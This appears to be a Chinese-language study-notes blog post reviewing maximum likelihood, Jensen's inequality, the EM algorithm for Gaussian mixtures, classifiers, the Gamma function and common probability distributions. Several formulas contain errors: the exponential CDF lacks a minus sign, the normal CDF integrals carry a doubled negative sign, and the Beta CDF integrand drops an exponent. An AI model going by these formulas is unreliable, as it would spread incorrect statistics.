<p>那么单个观测值的概率密度函数为：<br>$$<br>f(x|\mu,\sigma^2) &#x3D; \frac{1}{\sqrt{2\pi\sigma^2}}exp(-\frac{(x-\mu)^2}{2\sigma^2})<br>$$<br><strong>似然函数</strong>表示在给定参数$\mu和 \sigma^2$下，观测到当前数据的概率：<br>$$<br>L(\mu,\sigma^2) &#x3D; \prod_{i&#x3D;1}^{10}f(x|\mu,\sigma^2)<br>$$<br>为了方便计算，一般对似然函数<strong>求对数</strong>：<br>$$<br>\ell(\mu, \sigma^2) &#x3D; -\frac{10}{2} \ln(2\pi\sigma^2) - \frac{1}{2\sigma^2} \sum_{i&#x3D;1}^{10} (x_i - \mu)^2<br>$$</p>
<h3 id="极大似然估计"><a href="#极大似然估计" class="headerlink" title="极大似然估计"></a>极大似然估计</h3><p>求对应事件概率求导数（多个参数求偏导）的零点，此时的参数值就是极大似然值。</p>
<p><strong>继续例：</strong></p>
<p>估计均值$\mu$， 对$\mu$求偏导，并求零点：<br>$$<br>\frac{\partial \ell}{\partial \mu} &#x3D; -\frac{1}{\sigma^2} \sum_{i&#x3D;1}^{10} (x_i - \mu) &#x3D; 0<br>$$<br>解得：<br>$$<br>\mu &#x3D; \frac{1}{10} \sum_{i&#x3D;1}^{10} x_i<br>$$<br>即，<strong>样本均值是均值的极大似然估计</strong>。</p>
<p>估计方差$\sigma^2$，对$\sigma^2$求偏导，并求零点：<br>$$<br>\frac{\partial \ell}{\partial \sigma^2} &#x3D; -\frac{10}{2\sigma^2} + \frac{1}{2\sigma^4}\sum_{i&#x3D;1}^{10} (x_i - \mu)^2 &#x3D; 0<br>$$<br>解得：<br>$$<br>\sigma^2 &#x3D; \frac{1}{10} \sum_{i&#x3D;1}^{10} (x_i-\mu)^2<br>$$<br>即，<strong>方差的极大似然估计为样本数据与均值差的平方的平均值</strong>。</p>
<h2 id="Jensen不等式"><a href="#Jensen不等式" class="headerlink" title="Jensen不等式"></a>Jensen不等式</h2><h3 id="Jensen不等式定义"><a href="#Jensen不等式定义" class="headerlink" title="Jensen不等式定义"></a>Jensen不等式定义</h3><p>Jensen 不等式是数学分析和概率论中的⼀个重要不等式，描述了凸（或 凹）函数与随机变量期望之间的关系。简单来说，它揭示了在凸函数下， 函数作用于期望值小于等于期望值作用于函数。</p>
<p><strong>数学表述：</strong></p>
<ul>
<li>对于凸函数 $f$：</li>
</ul>
<p>$$<br>f(\mathbb{E}[X]) \leq \mathbb{E}[f(X)]<br>$$</p>
<ul>
<li>对于凹函数 $f$：</li>
</ul>
<p>$$<br>f(\mathbb{E}[X]) \geq \mathbb{E}[f(X)]<br>$$</p>
<p>其中，$\mathbb{E}[X]$是随机变量 $X$ 的期望值，$\mathbb{E}[f(X)]$是函数 $f$ 作用于 $X$ 后的期望值。</p>
<p>注：这里的凹凸函数，</p>
<ul>
<li>凸函数：图像“开口向上”，如$f(x)&#x3D;x^2$。</li>
<li>凹函数：题型“开口向下”，如$f(x)&#x3D;\ln x$。</li>
</ul>
<p><strong>Jensen不等式的直观含义：</strong></p>
<ul>
<li>对于<strong>凸函数</strong>，函数作用于平均值的结果 <strong>不大于</strong> 平均值作用于函数的结果。</li>
<li>对于<strong>凹函数</strong>，函数作用于平均值的结果 <strong>不小于</strong> 平均值作用于函数的结果。</li>
</ul>
<p>这意味着，凸函数下的平均值“低估“了个体值经过函数后的平均，而凹函数下的平均值“高估“了个体值经过函数后的平均。</p>
<h3 id="Jensen不等式在EM中的作用"><a href="#Jensen不等式在EM中的作用" class="headerlink" title="Jensen不等式在EM中的作用"></a>Jensen不等式在EM中的作用</h3><p><strong>在EM 算法中，Jensen 不等式用于确保在每次迭代中，对数似然函数的值不会降低，从而保证算法的收敛性。</strong>  </p>
<p><strong>原理</strong></p>
<ul>
<li><p><strong>挑战</strong>：直接最大化不完全数据的对数似然函数$lnp(X;\theta)$可能非常复杂，尤其当存在隐变量$Z$时。</p>
</li>
<li><p><strong>解决方案</strong>：引入一个下界来近似对数似然函数，这个下界通过 Jensen 不等式构造。</p>
</li>
<li><p>$ln(E(X)) &gt;&#x3D; E(ln(X))$ 是实现收敛的关键。</p>
</li>
</ul>
<h4 id="利用-Jensen-不等式构造下界"><a href="#利用-Jensen-不等式构造下界" class="headerlink" title="利用 Jensen 不等式构造下界"></a><strong>利用 Jensen 不等式构造下界</strong></h4><p>从对数似然函数开始：<br>$$<br>\ln p(X; \theta) &#x3D; \ln \int p(X, Z; \theta) , dZ<br>$$</p>
<p>引入任意分布 $q(Z)$ （通常选取$ q(Z)&#x3D;p(Z∣X;θ^{(t)})$）:<br>$$<br>\ln p(X; \theta) &#x3D; \ln \int q(Z) \frac{p(X, Z; \theta)}{q(Z)} , dZ<br>$$<br>应用 Jensen 不等式（因为对数函数是凹函数）：<br>$$<br>\ln p(X; \theta) \geq \int q(Z) \ln \frac{p(X, Z; \theta)}{q(Z)} , dZ<br>$$<br>定义辅助函数 $Q(\theta, \theta^{(t)})$：<br>$$<br>Q(\theta, \theta^{(t)}) &#x3D; \int p(Z \mid X; \theta^{(t)}) \ln p(X, Z; \theta) , dZ<br>$$<br>EM 算法的目标是最大化这个下界 $Q(\theta, \theta^{(t)})$。</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a><strong>步骤</strong></h4><ol>
<li><strong>E 步（期望步）：</strong></li>
</ol>
<p>​	计算$Q(\theta, \theta^{(t)})$，即在当前参数$\theta^{(t)}$下，计算隐变量的后验分布$p(Z∣X;θ(t)$并求期望。</p>
<ol start="2">
<li><strong>M 步（最大化步）：</strong></li>
</ol>
<p>​	最大化$Q(\theta, \theta^{(t)})$来更新参数$\theta$。</p>
<p><strong>Jensen不等式的作用：</strong></p>
<p><strong>确保每次迭代中，对数似然函数 $\ln p(X;\theta)$ 不减</strong>：</p>
<ul>
<li>由于$Q(\theta, \theta^{(t)})$是$\ln p(X;\theta)$的下界，最大化$Q$会使$\ln p(X;\theta)$增加或保持不变。</li>
</ul>
<p><strong>保证算法收敛</strong>：</p>
<ul>
<li>通过持续提高对数似然函数值，EM算法在每次迭代中都朝着局部最优解前进。</li>
</ul>
<h2 id="EM算法-1"><a href="#EM算法-1" class="headerlink" title="EM算法"></a>EM算法</h2><h3 id="EM含义"><a href="#EM含义" class="headerlink" title="EM含义"></a>EM含义</h3><p>EM是一个在已知部分相关变量的情况下，估计未知变量的迭代技术。</p>
<p>EM（Expectation-Maximization）算法是一种迭代优化算法，通常用于含有<strong>隐变量</strong>或<strong>不完全数据</strong>的概率模型中，以估计模型的参数。</p>
<p>EM 算法在每次迭代中交替执行以下两个步骤：</p>
<ol>
<li><strong>E 步骤（期望步骤）</strong><br>在给定当前参数估计值的条件下，计算隐变量的<strong>期望值</strong>。也就是计算隐变量的条件分布，然后基于这个分布计算某些统计量。</li>
<li><strong>M 步骤（最大化步骤）</strong><br>最大化完全数据的对数似然函数，调整参数以使当前的期望对数似然值最大。</li>
</ol>
<p>通过不断迭代 E 步骤和 M 步骤，EM 算法可以收敛到局部最优解。</p>
<h3 id="EM数学原理"><a href="#EM数学原理" class="headerlink" title="EM数学原理"></a>EM数学原理</h3><p><strong>问题描述</strong></p>
<p>假设我们有观测数据 $X$ 和 隐含数据 $Z$，目标是估计模型参数 $\theta$，使得观测数据的对数似然函数 $\ln p(X; \theta)$最大化。</p>
<p>直接求解 $\ln p(X; \theta)$可能困难，因为它涉及对隐变量 $Z$ 的积分或求和：<br>$$<br>\ln p(X;\theta) &#x3D; \ln \int p(X,Z;\theta)dZ<br>$$<br><strong>引入完整数据对数似然</strong></p>
<p>定义完整数据（观测数据和隐变量）对数似然函数：<br>$$<br>\ln p(X,Z;\theta)<br>$$<br>由于无法直接观测到$Z$，我们无法直接最大化这个函数，但可以通过<strong>条件期望</strong>来解决。</p>
<p><strong>EM算法步骤</strong></p>
<p><strong>E步（期望步）</strong></p>
<p>计算在当前参数$\theta^{(t)}$ 下，完整数据对数似然的条件期望：<br>$$<br>Q(\theta, \theta^{(t)})&#x3D;E_{Z|X;\theta^{(t)}}[\ln p(X,Z;\theta)]<br>$$<br>$E_{Z|X;\theta^{(t)}}$表示在给定观测数据 $X$和当前参数下$\theta^{(t)}$，对隐变量$Z$求条件期望。</p>
<p><strong>M步（最大化步）</strong></p>
<p>在E步计算的条件期望基础上，找到新的参数$\theta^{(t+1)}$，使$Q(\theta, \theta^{(t)})$最大化：<br>$$<br>\theta^{(t+1)} &#x3D; \arg \underset{\theta}{\max}Q(\theta, \theta^{(t)})<br>$$<br><strong>收敛性</strong></p>
<p>EM算法通过Jensen不等式保证了对数似然函数在每次迭代中不减：<br>$$<br>\ln p(X; \theta^{(t+1)}) \geq \ln p(X; \theta^{(t)})<br>$$<br>因此，EM算法在每次迭代中都朝着使对数似然函数增大的方向前进，最终收敛到一个局部极大值。</p>
<h3 id="EM适用场景"><a href="#EM适用场景" class="headerlink" title="EM适用场景"></a>EM适用场景</h3><p>最大期望（EM）算法是在概率模型中寻找参数最大似然估计或者最大后验估计的算法，其中概率模型依赖于无法观测的隐变量。</p>
<ul>
<li><p><strong>含有隐变量的模型</strong>: 如高斯混合模型(GMM)、隐马尔可夫模型(HMM)等；</p>
</li>
<li><p><strong>不完全数据</strong>: 数据集中存在缺失值，需要估计缺失部分；</p>
</li>
<li><p><strong>参数估计困难</strong>: 直接最大化似然函数过于复杂或不可行；</p>
</li>
</ul>
<h2 id="应用：混合高斯模型"><a href="#应用：混合高斯模型" class="headerlink" title="应用：混合高斯模型"></a>应用：混合高斯模型</h2><p><strong>高斯混合模型</strong>是一种常用的聚类模型，假设数据由多个高斯分布（即正态分布）的混合生成，但我们无法直接观测到每个数据点来自哪个高斯分量。</p>
<p><strong>目标：</strong></p>
<ul>
<li>估计每个高斯分量的参数（均值$\mu_k$、协方差$\Sigma_k$）和混合系数$\pi_k$。</li>
<li>将数据按照概率分配给不同的高斯分类，实现聚类。</li>
</ul>
<p><strong>模型定义</strong></p>
<ul>
<li>数据集：$X&#x3D;\lbrace x_1,x_2,…,x_N \rbrace$</li>
<li>高斯分量数：$K$</li>
<li>模型参数：$\theta &#x3D; \lbrace \pi_k,\mu_k,\Sigma_k\rbrace_{k&#x3D;1}^K$<ul>
<li>$\pi_k$：第$i$个高斯分类的混合系数，满足$\Sigma_{k&#x3D;1}^K \pi_k &#x3D; 1$。</li>
<li>$\mu_k,\Sigma_k$：第$i$个高斯分类的均值和协方差矩阵。</li>
</ul>
</li>
</ul>
<p><strong>隐变量</strong></p>
<ul>
<li>对每个数据点$x_i$，引入隐变量$z_i$，表示其所属的高斯分类：<ul>
<li>$z_i \in \lbrace 1,2,…,K \rbrace$</li>
<li>$p(z_i &#x3D;k) &#x3D; \pi_k$</li>
</ul>
</li>
</ul>
<p><strong>EM算法具体步骤</strong></p>
<p><strong>初始化</strong></p>
<ul>
<li>随机初始化模型参数$\theta^{(0)} &#x3D; \lbrace \pi_k^{(0)}, \mu_k^{(0)}, \Sigma_k^{(0)}  \rbrace$。</li>
</ul>
<p><strong>迭代直到收敛</strong></p>
<p><strong>1.E步（计算后验概率）</strong></p>
<p>计算在当前参数下，每个数据点$x_i$属于第$k$个高斯分类的后验概率（即<strong>责任度</strong>）：<br>$$<br>\gamma_{ik} &#x3D; p(z_i&#x3D;k \mid x_i; \theta^{(t)}) &#x3D; \frac{\pi_k^{(t)}\mathcal{N}(x_i \mid \mu_k^{(t)},\Sigma_k^{(t)})}{\Sigma_{j&#x3D;1}^K \pi_j^{(t)} \mathcal{N}(x_i \mid \mu_j^{(t)}, \Sigma_j^{(t)}) }<br>$$</p>
<ul>
<li>$\mathcal{N}(x_i \mid \mu_k,\Sigma_k)$是第$k$个高斯分类的概率密度函数</li>
</ul>
<p><strong>2.M步（更新参数）</strong></p>
<p>利用E步计算的责任度$\gamma_{ik}$，更新模型参数：</p>
<ul>
<li><p>更新混合系数$\pi_k$：<br>$$<br>\pi_k^{(t+1)} &#x3D; \frac{N_k}{N}<br>$$<br>其中，$N_k&#x3D;\Sigma_{i&#x3D;1}^N \gamma_{ik}$。</p>
</li>
<li><p>更新均值$\mu_k$：&#96;1<br>$$<br>\mu_k^{(t+1)} &#x3D; \frac{1}{N_k}\Sigma_{i&#x3D;1}^{N} \gamma_{ik} x_i<br>$$</p>
</li>
<li><p>更新协方差矩阵$\Sigma_k$：<br>$$<br>\Sigma_k^{(t+1)} &#x3D; \frac{1}{N_k}\Sigma_{i&#x3D;1}^{N}\gamma_{ik}(x_i-\mu_k^{(t+1)})(x_i-\mu_k^{(t+1)})^T<br>$$</p>
</li>
</ul>
<p><strong>检查收敛</strong></p>
<p>计算对数似然函数$\ln p(X; \theta^{(t+1)})$，判断是否满足收敛条件（如参数变化或对数似然函数增量小于设定的阈值）。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>假设我们有一维数据集，由两个高斯分布混合而成：<br>$$<br>X&#x3D;[1.0,1.2,0.8,5.0,5.2,4.8]<br>$$<br>目标是将数据分为两类，并估计每个高斯分布的参数。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106151431944.png" alt="image-20250106151431944"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106151453556.png" alt="image-20250106151453556"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106151543736.png" alt="image-20250106151543736"></p>
<h2 id="EM优缺点"><a href="#EM优缺点" class="headerlink" title="EM优缺点"></a>EM优缺点</h2><p><strong>优点</strong></p>
<ul>
<li><strong>处理含有隐变量的模型</strong>：能够在数据不完全或含有隐变量的情况下，估计参数模型。</li>
<li><strong>实现简单</strong>：E步和M步通常具有明确的计算步骤，易于实现。</li>
<li><strong>广泛适用</strong>：适用于各种概率模型，如混合模型、隐马尔可夫模型等。</li>
</ul>
<p><strong>局限</strong></p>
<ul>
<li><strong>收敛到局部极大值</strong>：EM算法可能收敛到局部最优解，依赖于初始参数的选择。</li>
<li><strong>收敛速度慢</strong>：在某些情况下，算法收敛速度较慢。</li>
<li><strong>需要计算条件期望</strong>：对于复杂模型，E步可能计算复杂或无法解析求解。</li>
</ul>
<h2 id="其他应用"><a href="#其他应用" class="headerlink" title="其他应用"></a>其他应用</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106152317650.png" alt="image-20250106152317650"></p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="【分类】的定义"><a href="#【分类】的定义" class="headerlink" title="【分类】的定义"></a>【分类】的定义</h2><p>给定一组标记实体的训练集，制定一个规则，为测试集中的实体分配标签。</p>
<h2 id="【分类】应用场景"><a href="#【分类】应用场景" class="headerlink" title="【分类】应用场景"></a>【分类】应用场景</h2><p>垃圾邮件过滤、数字识别、欺诈检测、网页垃圾检测、语音识别和说话者识别、医学诊断、自动论文评分、电子邮件路由、社交网络中的链接预测、药物设计中的催化活性…</p>
<h2 id="训练和验证测试集的划分"><a href="#训练和验证测试集的划分" class="headerlink" title="训练和验证测试集的划分"></a>训练和验证测试集的划分</h2><p>在训练集上估计参数（train）</p>
<p>在验证集上调整超参数（validation）</p>
<p>在测试集上报告结果（test）</p>
<ul>
<li><p><strong>数据分布一致</strong></p>
<ul>
<li>确保训练集、验证集和测试集具有相似的数据分布，避免模型在验证或测试时性能大幅下降。</li>
</ul>
</li>
<li><p><strong>互相独立</strong></p>
<ul>
<li>训练集、验证集、测试集之间的数据不能有重叠，否则会导致数据泄漏，影响模型的评估真实性。</li>
</ul>
</li>
<li><p><strong>合理的比例划分</strong></p>
<ul>
<li><p>常见划分比例为：</p>
<ul>
<li><strong>训练集</strong>：约 60%-80%，用于训练模型。</li>
<li><strong>验证集</strong>：约 10%-20%，用于调参和选择最佳模型。</li>
<li><strong>测试集</strong>：约 10%-20%，用于评估最终模型性能。</li>
</ul>
</li>
<li><p>在数据量较小的情况下，可采用交叉验证（如 k-fold）充分利用数据。</p>
</li>
</ul>
</li>
<li><p><strong>类别平衡</strong></p>
<ul>
<li>如果是分类问题，确保每个类别在训练集、验证集、测试集中有相似的比例，防止数据不平衡对结果的影响。</li>
</ul>
</li>
<li><p><strong>时间相关性（时序数据）</strong></p>
<ul>
<li>如果数据有时间顺序（如股票价格、天气数据），应避免未来数据出现在训练集中，否则会导致“数据泄漏”。通常将时间靠后的数据划为验证或测试集。</li>
</ul>
</li>
<li><p><strong>数据预处理一致性</strong></p>
<ul>
<li>数据预处理步骤（如标准化、归一化、特征选择）应基于训练集的统计量，并应用到验证集和测试集，防止数据泄漏。</li>
</ul>
</li>
</ul>
<h2 id="常见的分类器"><a href="#常见的分类器" class="headerlink" title="常见的分类器"></a>常见的分类器</h2><ul>
<li>支持向量机</li>
<li>随机森林</li>
<li>核化逻辑回归</li>
<li>核化判别分析</li>
<li>核化感知器</li>
<li>贝叶斯分类器</li>
<li>增强和其他集成方法</li>
</ul>
<h2 id="常用分类方法"><a href="#常用分类方法" class="headerlink" title="常用分类方法"></a>常用分类方法</h2><ul>
<li>贝叶斯</li>
<li>决策树</li>
<li>SVM（支持向量机）</li>
<li>KNN（K近邻算法）</li>
<li>逻辑回归</li>
<li>神经网络</li>
<li>深度学习</li>
<li>集成学习</li>
</ul>
<h2 id="贝叶斯"><a href="#贝叶斯" class="headerlink" title="贝叶斯"></a>贝叶斯</h2><h3 id="贝叶斯公式"><a href="#贝叶斯公式" class="headerlink" title="贝叶斯公式"></a>贝叶斯公式</h3><p>$$<br>P(A|B) &#x3D; P(A)\frac{P(B|A)}{P(B)}<br>$$</p>
<p>$$<br>后验概率 &#x3D; 先验概率 \times 调整因子<br>$$</p>
<p><strong>例题</strong>：假设某种疾病的发病率为0.001（1000个⼈中会有⼀个⼈得病），现有⼀种试剂在患者确实得病的情况下，有99%的而率呈现为阳性，而在患者没有得病的情况下，它有5%的几率呈现为阳性（也就是假阳性），如有⼀位病人的检验成果为阳性，那么他的得病概率是多少呢？</p>
<p><strong>解答</strong>：</p>
<p>事件A：得病；事件B：阳性<br>$$<br>P(A|B) &#x3D; P(A) \frac{P(B|A)}{P(B)} &#x3D; 0.001 * \frac{0.99}{0.001 * 0.99 + 0.999 * 0.05} \approx 0.019<br>$$</p>
<h3 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106155904781.png" alt="image-20250106155904781" style="zoom:50%;" />



<p>参考数据仓库朴素贝叶斯计算：<a href="https://jinqiqing.cn/2024/12/30/%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E4%B8%8E%E7%9F%A5%E8%AF%86%E5%8F%91%E7%8E%B0-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#%E9%A2%98%E5%9E%8B4-%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%96%B9%E6%B3%95:~:text=%E5%88%86%E7%B1%BB%E4%B8%BA%20%3E%202000%E3%80%82-,%E9%A2%98%E5%9E%8B4%20%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E6%96%B9%E6%B3%95,-%E9%97%AE%EF%BC%9A%20%E4%BE%9D%E6%8D%AE%E8%AE%AD%E7%BB%83">数据仓库与知识发现2024 期末复习&#x2F;数据预处理与分类&#x2F;题型4 朴素贝叶斯方法</a></p>
<h2 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h2><h3 id="ID3算法"><a href="#ID3算法" class="headerlink" title="ID3算法"></a>ID3算法</h3><p>参考数据仓库决策树计算：<a href="https://jinqiqing.cn/2024/12/30/%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E4%B8%8E%E7%9F%A5%E8%AF%86%E5%8F%91%E7%8E%B0-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#%E9%A2%98%E5%9E%8B3-%E6%9E%84%E9%80%A0%E5%86%B3%E7%AD%96%E6%A0%91:~:text=56000%2C%2078000%5D%20%3A%201%2C6%2C9%2C12%2C14%2C16-,%E9%A2%98%E5%9E%8B3%20%E6%9E%84%E9%80%A0%E5%86%B3%E7%AD%96%E6%A0%91,-%E9%97%AE%EF%BC%9A%E4%BE%9D%E6%8D%AE%E8%AE%AD%E7%BB%83">数据仓库与知识发现2024 期末复习&#x2F;数据预处理与分类&#x2F;题型3 构造决策树</a></p>
<h3 id="C4-5算法"><a href="#C4-5算法" class="headerlink" title="C4.5算法"></a>C4.5算法</h3><p>C4.5算法是对ID3算法的改进，C4.5克服了ID3的以下2个缺点：</p>
<ul>
<li>用信息增益选择属性时偏向于选择分枝比较多的属性值，即取值多的属性；</li>
<li>不能处理连续属性；</li>
</ul>
<h1 id="Gamma函数"><a href="#Gamma函数" class="headerlink" title="Gamma函数"></a>Gamma函数</h1><h2 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h2><p>$$<br>\Gamma(x)&#x3D;\int_0^\infty t^{x-1}e^{-t}dt，其中x&gt;0<br>$$</p>
<h2 id="在实数域上的特征"><a href="#在实数域上的特征" class="headerlink" title="在实数域上的特征"></a>在实数域上的特征</h2><p>$$<br>\Gamma(x+1)&#x3D;x\Gamma(x)<br>$$</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106162423376.png" alt="image-20250106162423376" style="zoom:50%;" />

<h2 id="阶乘形式"><a href="#阶乘形式" class="headerlink" title="阶乘形式"></a>阶乘形式</h2><p>对于任意的正整数n：<br>$$<br>\Gamma(n)&#x3D;(n-1)~!<br>$$</p>
<p>问题：$(\frac{1}{2})!$是多少？</p>
<p>答：<br>$$<br>(\frac{1}{2})! &#x3D; \Gamma(\frac{3}{2})&#x3D;\frac{1}{2}\Gamma(\frac{1}{2})&#x3D;\frac{\sqrt{\pi}}{2}<br>$$</p>
<h1 id="Beta-分布"><a href="#Beta-分布" class="headerlink" title="Beta 分布"></a>Beta 分布</h1><h2 id="四个分布"><a href="#四个分布" class="headerlink" title="四个分布"></a>四个分布</h2><h3 id="二项分布"><a href="#二项分布" class="headerlink" title="二项分布"></a>二项分布</h3><p>二项分布是（Binomial Distribution）一种离散概率分布，描述了在 n 次独立重复试验中，成功发生的次数 X 的分布。每次试验有两个可能的结果（称为“成功”和“失败”），每次成功的概率为 p。<br>$$<br>P(X&#x3D;k) &#x3D; \begin{pmatrix}n \ k \end{pmatrix}p^k(1-p)^{n-k}<br>，其中\begin{pmatrix}n \ k \end{pmatrix} &#x3D; \frac{n!}{k!(n-k)!}<br>$$</p>
<p>$$<br>E(X) &#x3D; n\cdot p<br>$$</p>
<p>$$<br>Var(X) &#x3D; n \cdot p \cdot (1-p)<br>$$</p>
<p>模型特征：二项结果；概率为定值；事件独立</p>
<p>应用场景：质量控制、可靠性、排队</p>
<h3 id="泊松分布"><a href="#泊松分布" class="headerlink" title="泊松分布"></a>泊松分布</h3><p>泊松分布（Poisson Distribution）是一种离散概率分布，用来描述<strong>在单位时间或单位空间内事件发生的次数</strong>(用参数$\lambda$表示）。它的核心特点是，事件发生是独立的，且在单位时间或空间内的发生率是固定的。<br>$$<br>P(X&#x3D;k) &#x3D; \frac{\lambda^k e^{-\lambda}}{k!}<br>，其中\lambda 表示每单位时间内平均发生 \lambda 次事件<br>$$</p>
<p>$$<br>E(X) &#x3D; \lambda<br>$$</p>
<p>$$<br>Var(X) &#x3D; \lambda<br>$$</p>
<p>$$<br>累积分布函数F(x \leq k) &#x3D; \Sigma_{x&#x3D;0}^k \frac{\lambda^xe^{-\lambda}}{x!}<br>$$<br>模型特征：时间间隔或空间区域；一个事件发生的可能性极小；事件独立；事件以固定速率发生</p>
<p>应用场景：质量控制、可靠性、排队、物理性质</p>
<h3 id="指数分布"><a href="#指数分布" class="headerlink" title="指数分布"></a>指数分布</h3><p>指数分布（Exponential Distribution）是一种连续型概率分布，常用于描述<strong>事件发生的时间间隔</strong>。它回答的问题是：<strong>在某种随机过程中，从一个事件到下一个事件所需的时间有多长？</strong><br>$$<br>f(x;\lambda) &#x3D; \lambda e^{-\lambda x},<br>$$</p>
<p>$$<br>其中，x表示事件间隔时间（随机量），\lambda表示每单位时间内平均发生 \lambda 次事件<br>$$</p>
<p>$$<br>E(X) &#x3D; \frac{1}{\lambda}<br>$$</p>
<p>$$<br>Var(X) &#x3D; \frac{1}{\lambda^2}<br>$$</p>
<p>$$<br>累积分布函数F(x\leq k) &#x3D; \int_0^k \lambda e^{-\lambda x}dx &#x3D; 1-e^{\lambda k}<br>$$</p>
<p>模型特征：两次发生结果之间的时间或距离；泊松分布特征；使用泊松均值($\lambda$)</p>
<p>应用场景：质量控制、可靠性、排队、物理现象</p>
<h3 id="正态分布"><a href="#正态分布" class="headerlink" title="正态分布"></a>正态分布</h3><p>正态分布(Normal Distribution)，也称高斯分布 (Gaussian Distribution)，是统计学中最重要的一种连续型概率分布。它经常用于描述<strong>自然界中的随机现象</strong>，如身高、体重、考试成绩等变量的分布。<br>$$<br>概率密度函数f(x;\mu,\sigma^2) &#x3D; \frac{1}{\sqrt{2\pi\sigma^2}}e^{-\frac{(x-\mu)^2}{2\sigma^2}}，其中\mu为均值，\sigma^2为方差<br>$$</p>
<p>$$<br>累积分布函数F(x)&#x3D;\frac{1}{\sqrt{2\pi\sigma^2}}\int_{-\infty}^x exp(-\frac{-(v-\mu)^2}{2\sigma^2})dv<br>$$</p>
<p>$$<br>P(a\leq x\leq b)&#x3D;F(b)-F(a)&#x3D;\frac{1}{\sqrt{2\pi\sigma^2}}\int_a^bxp(-\frac{-(v-\mu)^2}{2\sigma^2})dv<br>$$</p>
<p>模型特征：“钟形”曲线；对测量现象有效；对多种不确定的源有效；两个参数($\mu和\sigma$)</p>
<p>应用场景：测量的现象；多种加性现象的测量结果；其他近似的分布；许多推断统计方法</p>
<p><strong>例题</strong>：假设一个公司员工的年龄符合正态分布，均值为50，标准差为5。计算50到52.5岁员工的比例。</p>
<p><strong>解答</strong>：</p>
<p>使用标准正态分布，令$Z&#x3D;(x-\mu)&#x2F; \sigma$，然后从表中获取累积分布函数：</p>
<p>​	$F(x\leq 50) &#x3D; F(Z \leq 0) &#x3D; 0.5000$</p>
<p>​	$F(x\leq 52.5) &#x3D; F(Z \leq 0.5) &#x3D; 0.6915$</p>
<p>得到</p>
<p>​	$P(50\leq x \leq 52.5 &#x3D; F(b) - F(a) &#x3D; 0.1915$</p>
<h2 id="Beta分布"><a href="#Beta分布" class="headerlink" title="Beta分布"></a>Beta分布</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>Beta分布是一种定义在区间[0, 1]上的连续概率分布，广泛用于描述随机变量在这个区间内的分布情况。它通常用于建模有限区间内（如概率、比例等）的不确定性，尤其是当我们对事件发生的概率有先验知识时。</p>
<p>模型特征：两端有界变量；多种分布形状；事件是独立的；模型比例</p>
<p>$$<br>f(x|\lambda_1,\lambda_2) &#x3D; \frac{\Gamma(\lambda_1+\lambda_2)}{\Gamma(\lambda_1)\Gamma(\lambda_2)}x^{\lambda_1-1}(1-x)^{\lambda_2-1}<br>$$</p>
<p>$$<br>其中，0\leq x \leq 1，\lambda_1,\lambda_2 \geq 0，<br>$$</p>
<p>$$<br>\Gamma(\lambda)为伽马函数，\Gamma(\lambda)&#x3D; \int_0^\infty x^{\lambda-1}e^{-x}dx 或 \Gamma(\lambda)&#x3D;(\lambda-1)!（当\lambda为正整数时）<br>$$</p>
<p>$$<br>E(Q)&#x3D;\frac{\lambda_1}{\lambda_1+\lambda_2}<br>$$</p>
<p>$$<br>Var(Q)&#x3D;\frac{\lambda_1\lambda_2}{(\lambda_1+\lambda_2)^2(\lambda_1+\lambda_2+1)}<br>$$</p>
<p>令 $n&#x3D;\lambda_1+\lambda_2,r&#x3D;\lambda_1，为正整数时$：<br>$$<br>f_\beta(q|r,n) &#x3D; \frac{(n-1)!}{(r-1)!(n-r-1)!}q^{r-1}(1-q)^{n-r-1}<br>$$</p>
<p>$$<br>其中，q为一个[0,1]的比值，r为成功的次数，n为实验次数<br>$$</p>
<p>$$<br>E(Q)&#x3D;\frac{r}{n}<br>$$</p>
<p>$$<br>Var(Q)&#x3D;\frac{r(n-r)}{n^2(n+1)}<br>$$</p>
<p>$$<br>累积分布函数F(Q \leq q|r,n)&#x3D;\frac{(n-1)!}{(r-1)!(n-r-1)}\int_0^q\upsilon^{r-1}(1-\upsilon)d\upsilon<br>$$</p>
<p>其累积分布函数也叫<strong>不完全Beta函数</strong>，与二项累积分布函数是等价的。</p>
<p><strong>例题</strong>：假设每年提交医疗福利申请的员工百分比是一个Beta随机变量。作为一家拥有40名员工的小公司的福利协调员，你目前预计大约30%的人今年最有可能提交索赔，确定超过16名员工提交索赔的概率。</p>
<p><strong>解答：</strong></p>
<p>​	$q&#x3D;\frac{16}{40}&#x3D;0.4,r &#x3D; 40 * 30 % &#x3D;12,n&#x3D;40.$</p>
<p>​	查表得：$F_\beta(Q\leq0.40|12,40)&#x3D;0.91$</p>
<p>​	因此：$P_\beta(Q&gt;0.40)&#x3D;1-0.91&#x3D;0.09$</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a><strong>应用场景</strong></h3><ul>
<li>比例或百分比</li>
<li>受限区间内的物理变量</li>
<li>质量控制和可靠性的公差</li>
<li>PERT网络（广义形式）</li>
<li>贝叶斯分析（先验信息）</li>
</ul>
